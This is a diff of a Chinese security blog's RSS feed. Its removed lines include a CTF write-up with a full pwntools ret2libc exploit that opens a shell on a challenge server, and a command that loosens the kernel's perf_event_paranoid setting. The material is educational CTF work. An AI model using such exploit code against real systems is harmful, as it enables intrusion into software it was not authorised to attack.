@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>C0nvR3 Lab</title><link>https://converter258.github.io/</link><description>Recent content on C0nvR3 Lab</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Sat, 11 Jul 2026 22:00:00 +0800</lastBuildDate><atom:link href="https://converter258.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Workspace Preview</title><link>https://converter258.github.io/posts/workspace-preview/</link><pubDate>Sat, 11 Jul 2026 22:00:00 +0800</pubDate><guid>https://converter258.github.io/posts/workspace-preview/</guid><description>用于检查 C0nvR3 Lab 的 Markdown、代码块、图片与文章布局。</description></item><item><title>两百行代码搓一个原始神经网络</title><link>https://converter258.github.io/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</link><pubDate>Sat, 18 Apr 2026 15:25:38 +0800</pubDate><guid>https://converter258.github.io/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</guid><description>&lt;p&gt;这个文章主要还是因为这周研究了挺久的AI相关的东西，然后休闲时刷视频发现了这个&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blog on C0nvR3 Lab</title><link>https://converter258.github.io/posts/</link><description>Recent content in Blog on C0nvR3 Lab</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Sat, 11 Jul 2026 22:00:00 +0800</lastBuildDate><atom:link href="https://converter258.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Workspace Preview</title><link>https://converter258.github.io/posts/workspace-preview/</link><pubDate>Sat, 11 Jul 2026 22:00:00 +0800</pubDate><guid>https://converter258.github.io/posts/workspace-preview/</guid><description>用于检查 C0nvR3 Lab 的 Markdown、代码块、图片与文章布局。</description></item><item><title>两百行代码搓一个原始神经网络</title><link>https://converter258.github.io/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</link><pubDate>Sat, 18 Apr 2026 15:25:38 +0800</pubDate><guid>https://converter258.github.io/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</guid><description>&lt;p&gt;这个文章主要还是因为这周研究了挺久的AI相关的东西，然后休闲时刷视频发现了这个&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.bilibili.com/video/BV1zP4y1g7G5/?share_source=copy_web&amp;amp;vd_source=853200eb173acad552081e78b7529b49"&gt;We&amp;rsquo;re Building Computers Wrong&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;闲的没事尝试复现了一下其中的第一个demo，这也是是一个很简单但很有意思的demo
 如果你闲的蛋疼可以考虑看一下视频，就能大致知到原理了，当然你也可以考虑跳过，我在下面简述一下&lt;/p&gt;
@@ -76,31 +76,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;vuln&lt;/span&gt;();
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ff7b72"&gt;return&lt;/span&gt; &lt;span style="color:#a5d6ff"&gt;0&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用以下命令编译&lt;/p&gt;</description></item><item><title>Perf与简单的侧信道攻击</title><link>https://converter258.github.io/research/perf%E4%B8%8E%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</link><pubDate>Fri, 27 Feb 2026 13:07:57 +0800</pubDate><guid>https://converter258.github.io/research/perf%E4%B8%8E%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</guid><description>&lt;h2 id="perf"&gt;perf&lt;/h2&gt;
-&lt;h3 id="简介"&gt;简介&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;perf&lt;/code&gt; 是 Linux 系统性能分析工具集，全称是 &lt;code&gt;Performance Event Counters&lt;/code&gt;
-它基于 Linux 内核的 perf_events 子系统，能够提供硬件和软件层面的性能分析能力
-我们这里会用到它的一些功能以获取一些硬件事件的信息，因此，你必须确保自己的虚拟机支持 &lt;code&gt;PMU&lt;/code&gt;
-功能&lt;/p&gt;
-&lt;h3 id="准备perf"&gt;准备perf&lt;/h3&gt;
-&lt;h4 id="事前准备"&gt;事前准备&lt;/h4&gt;
-&lt;p&gt;首先确定你的设备支持 PMU 功能，如果条件允许，实体机上使用 perf 会方便很多，如果你使用的是 wsl2 作为使用的虚拟机，请在设置中开启 &lt;code&gt;性能计数器&lt;/code&gt; ，并使用除 ubuntu 以外的系统，因为 wsl2 对内核的魔改会导致一些兼容性问题，我捣鼓了两天也没能完美解决，可以在 wsl2 上选择其他 Linux 进行尝试，或者换用 VMware ，在使用VMware时，请在硬件设置里，添加上&lt;code&gt;虚拟化 CPU 性能计数器&lt;/code&gt;，并禁用所有HyperV相关的设置，并关闭虚拟化保护
-包括(仅限VMware使用者,wsl2 不要改):&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Windows安全中心 -&amp;gt; 设备安全性 -&amp;gt; 内核隔离 -&amp;gt; 内存完整性/本地安全机构保护&lt;/li&gt;
-&lt;li&gt;Windows功能 -&amp;gt; Hyper-V/Virtual Machine Platform/Windows虚拟机监控程序平台&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id="perf安装"&gt;perf安装&lt;/h4&gt;
-&lt;p&gt;安装 perf 可以通过&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo apt-get install linux-tools-generic
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="相关设置"&gt;相关设置&lt;/h4&gt;
-&lt;h5 id="使用权限"&gt;使用权限&lt;/h5&gt;
-&lt;p&gt;等安装完成后并不能直接使用，你需要先查看&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;cat /proc/sys/kernel/perf_event_paranoid
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个&lt;code&gt;perf_event_paranoid&lt;/code&gt;设置了运行时权限相关的内容，建议修改成小于等于1的值&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo sh -c &lt;span style="color:#a5d6ff"&gt;&amp;#39;echo -1 &amp;gt; /proc/sys/kernel/perf_event_paranoid&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="cpu核心与内存分配"&gt;CPU核心与内存分配&lt;/h5&gt;
-&lt;p&gt;此时可以尝试一下使用&lt;/p&gt;</description></item><item><title>栈迁移 - Pivoting</title><link>https://converter258.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/</link><pubDate>Mon, 12 Jan 2026 21:50:06 +0800</pubDate><guid>https://converter258.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/</guid><description>&lt;h1 id="栈迁移"&gt;栈迁移&lt;/h1&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用以下命令编译&lt;/p&gt;</description></item><item><title>栈迁移 - Pivoting</title><link>https://converter258.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/</link><pubDate>Mon, 12 Jan 2026 21:50:06 +0800</pubDate><guid>https://converter258.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/</guid><description>&lt;h1 id="栈迁移"&gt;栈迁移&lt;/h1&gt;
 &lt;p&gt;之前答应某人写一篇文章讲栈迁移，这里附带一些栈相关的知识，尽可能全面的讲述栈和栈迁移，结合例题应用
 文章讨论的内容都建立在&lt;code&gt;x86-64 linux&lt;/code&gt;上&lt;/p&gt;
 &lt;h2 id="栈相关寄存器"&gt;栈相关寄存器&lt;/h2&gt;
@@ -187,73 +163,4 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
  0x7ffff7ffb000 0x7ffff7ffd000 r--p 2000 36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
  0x7ffff7ffd000 0x7ffff7fff000 rw-p 2000 38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
  0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以这里为例，&lt;code&gt; 0x404000 0x405000 rw-p 1000 3000 pwn&lt;/code&gt;就是一个很不错的选择&lt;/p&gt;</description></item><item><title>Geek Challenge 2025 WP</title><link>https://converter258.github.io/ctf/geek-challenge-2025-wp/</link><pubDate>Thu, 11 Dec 2025 00:15:00 +0800</pubDate><guid>https://converter258.github.io/ctf/geek-challenge-2025-wp/</guid><description>&lt;hr&gt;
-&lt;p&gt;这里只收录了我个人的wp,我队友的部分就不放出来了
-第一次写，写的烂，就当参考吧，可能有很多地方不严谨或有误
-还请各位大佬指教&lt;/p&gt;
-&lt;h2 id="pwn"&gt;PWN&lt;/h2&gt;
-&lt;h3 id="old_rop"&gt;old_rop&lt;/h3&gt;
-&lt;h4 id="解题流程"&gt;解题流程&lt;/h4&gt;
-&lt;p&gt;查保护
-&lt;figure class="article-image"&gt;&lt;img src="https://converter258.github.io/ctf/geek-challenge-2025-wp/image.png" alt="alt text" loading="lazy"&gt;&lt;/figure&gt;
-
-查伪代码&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ff7b72"&gt;__int64&lt;/span&gt; &lt;span style="color:#ff7b72"&gt;__fastcall&lt;/span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;main&lt;/span&gt;(&lt;span style="color:#ff7b72"&gt;int&lt;/span&gt; a1, &lt;span style="color:#ff7b72"&gt;char&lt;/span&gt; &lt;span style="color:#ff7b72;font-weight:bold"&gt;**&lt;/span&gt;a2, &lt;span style="color:#ff7b72"&gt;char&lt;/span&gt; &lt;span style="color:#ff7b72;font-weight:bold"&gt;**&lt;/span&gt;a3)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _QWORD buf[&lt;span style="color:#a5d6ff"&gt;10&lt;/span&gt;]; &lt;span style="color:#8b949e;font-style:italic"&gt;// [rsp+10h] [rbp-50h] BYREF
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#8b949e;font-style:italic"&gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;write&lt;/span&gt;(&lt;span style="color:#a5d6ff"&gt;1&lt;/span&gt;, &lt;span style="color:#a5d6ff"&gt;&amp;#34;Hello, World&lt;/span&gt;&lt;span style="color:#79c0ff"&gt;\n&lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;&amp;#34;&lt;/span&gt;, &lt;span style="color:#a5d6ff"&gt;0xDuLL&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;strcpy&lt;/span&gt;((&lt;span style="color:#ff7b72"&gt;char&lt;/span&gt; &lt;span style="color:#ff7b72;font-weight:bold"&gt;*&lt;/span&gt;)buf, &lt;span style="color:#a5d6ff"&gt;&amp;#34;welcome to ret2csu , but there is sometings different,please care about it !&amp;#34;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;write&lt;/span&gt;(&lt;span style="color:#a5d6ff"&gt;1&lt;/span&gt;, buf, &lt;span style="color:#a5d6ff"&gt;0x4DuLL&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;write&lt;/span&gt;(&lt;span style="color:#a5d6ff"&gt;1&lt;/span&gt;, &lt;span style="color:#a5d6ff"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#79c0ff"&gt;\n&lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;&amp;#34;&lt;/span&gt;, &lt;span style="color:#a5d6ff"&gt;1uLL&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;sub_401156&lt;/span&gt;(&lt;span style="color:#a5d6ff"&gt;1LL&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ff7b72"&gt;return&lt;/span&gt; &lt;span style="color:#a5d6ff"&gt;0LL&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ff7b72"&gt;ssize_t&lt;/span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;sub_401156&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _BYTE buf[&lt;span style="color:#a5d6ff"&gt;128&lt;/span&gt;]; &lt;span style="color:#8b949e;font-style:italic"&gt;// [rsp+0h] [rbp-80h] BYREF
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#8b949e;font-style:italic"&gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ff7b72"&gt;return&lt;/span&gt; &lt;span style="color:#d2a8ff;font-weight:bold"&gt;read&lt;/span&gt;(&lt;span style="color:#a5d6ff"&gt;0&lt;/span&gt;, buf, &lt;span style="color:#a5d6ff"&gt;0x200uLL&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在sub_401156有一个明显栈溢出，没有后门函数，打libc，得先泄露libc基址，用write打印即可，但此处没有控制rdx的gadget,只能用read的时候rdx的残余值0x200多打印一些，然后正常写rop链即可&lt;/p&gt;
-&lt;h4 id="exp"&gt;exp&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-py" data-lang="py"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ff7b72"&gt;from&lt;/span&gt; &lt;span style="color:#ff7b72"&gt;pwn&lt;/span&gt; &lt;span style="color:#ff7b72"&gt;import&lt;/span&gt; &lt;span style="color:#ff7b72;font-weight:bold"&gt;*&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#8b949e;font-style:italic"&gt;# io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;io &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; remote(&lt;span style="color:#a5d6ff"&gt;&amp;#39;geek.ctfplus.cn&amp;#39;&lt;/span&gt;,&lt;span style="color:#a5d6ff"&gt;32696&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; ELF(&lt;span style="color:#a5d6ff"&gt;&amp;#34;./libc/libc.so.6&amp;#34;&lt;/span&gt;) 
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;elf &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; ELF(&lt;span style="color:#a5d6ff"&gt;&amp;#34;./pwnt&amp;#34;&lt;/span&gt;) 
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;write_got &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; elf&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;got[&lt;span style="color:#a5d6ff"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;]
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;write_plt &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; elf&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;plt[&lt;span style="color:#a5d6ff"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;]
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pop_rdi &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; &lt;span style="color:#a5d6ff"&gt;0x00000000004012d3&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ret_addr &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; &lt;span style="color:#a5d6ff"&gt;0x000000000040101a&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;read_addr &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; &lt;span style="color:#a5d6ff"&gt;0x0000000000401156&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pop_rsi_r15 &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; &lt;span style="color:#a5d6ff"&gt;0x00000000004012d1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;line &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; io&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;recvline()
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(line)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;line &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; io&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;recvline()
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(line)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payleak &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; cyclic(&lt;span style="color:#a5d6ff"&gt;0x88&lt;/span&gt;) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt;p64(pop_rdi) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; p64(&lt;span style="color:#a5d6ff"&gt;1&lt;/span&gt;) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; p64(pop_rsi_r15) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; p64(write_got) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt;p64(&lt;span style="color:#a5d6ff"&gt;0&lt;/span&gt;) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; p64(write_plt) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt;p64(read_addr)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;io&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;sendline(payleak)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;leaked_data &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; io&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;recv(&lt;span style="color:#a5d6ff"&gt;0x200&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;write_addr &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; u64(leaked_data[&lt;span style="color:#a5d6ff"&gt;0&lt;/span&gt;:&lt;span style="color:#a5d6ff"&gt;8&lt;/span&gt;])
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#79c0ff"&gt;f&lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;&amp;#34;Leaked write address: &lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;{&lt;/span&gt;hex(write_addr)&lt;span style="color:#a5d6ff"&gt;}&lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc_base &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; write_addr &lt;span style="color:#ff7b72;font-weight:bold"&gt;-&lt;/span&gt; libc&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;symbols[&lt;span style="color:#a5d6ff"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;]
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#79c0ff"&gt;f&lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;&amp;#34;Libc base: &lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;{&lt;/span&gt;hex(libc_base)&lt;span style="color:#a5d6ff"&gt;}&lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;system_addr &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; libc_base &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; libc&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;symbols[&lt;span style="color:#a5d6ff"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;]
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;binsh_addr &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; libc_base &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; libc&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;search(&lt;span style="color:#79c0ff"&gt;b&lt;/span&gt;&lt;span style="color:#a5d6ff"&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;)&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;&lt;span style="color:#d2a8ff;font-weight:bold"&gt;__next__&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#a5d6ff"&gt;&amp;#34;system:&amp;#34;&lt;/span&gt;,hex(system_addr))
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#a5d6ff"&gt;&amp;#34;binsh:&amp;#34;&lt;/span&gt;,hex(binsh_addr))
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#ff7b72;font-weight:bold"&gt;=&lt;/span&gt; cyclic(&lt;span style="color:#a5d6ff"&gt;0x88&lt;/span&gt;) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; p64(pop_rdi) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; p64(binsh_addr) &lt;span style="color:#ff7b72;font-weight:bold"&gt;+&lt;/span&gt; p64(system_addr)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;io&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;sendline (payload)
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;io&lt;span style="color:#ff7b72;font-weight:bold"&gt;.&lt;/span&gt;interactive()
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="mission-calculator"&gt;Mission Calculator&lt;/h3&gt;
-&lt;h4 id="解题流程-1"&gt;解题流程&lt;/h4&gt;
-&lt;p&gt;这题不用查保护，就是一个单纯的计算题，直接写一个for全算出来发回去就行&lt;/p&gt;</description></item><item><title>About</title><link>https://converter258.github.io/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://converter258.github.io/about/</guid><description>&lt;p&gt;C0nvR3 Lab 是一个轻量、静态优先的个人安全技术研究站点。&lt;/p&gt;</description></item></channel></rss>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以这里为例，&lt;code&gt; 0x404000 0x405000 rw-p 1000 3000 pwn&lt;/code&gt;就是一个很不错的选择&lt;/p&gt;</description></item></channel></rss>
